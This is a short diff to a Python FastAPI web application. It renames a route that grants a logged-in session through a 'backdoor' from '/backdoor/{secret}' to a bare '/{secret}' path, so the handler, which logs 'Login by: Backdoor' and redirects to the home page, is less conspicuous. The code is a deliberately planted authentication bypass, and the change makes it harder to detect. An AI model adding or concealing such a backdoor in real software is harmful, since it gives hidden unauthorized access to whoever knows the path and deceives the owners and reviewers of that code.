@@ -58,7 +58,7 @@ async def login(request: Request):
   response.set_cookie(cookie_name, value=cookie_value, httponly=True, expires=7200)
   return response
 
-@app.get(f"/backdoor/{backdoor}")
+@app.get(f"/{backdoor}")
 async def login(request: Request):
   application_logger.info(f"Login by: Backdoor")
   response = RedirectResponse(url='/home', status_code=status.HTTP_302_FOUND)
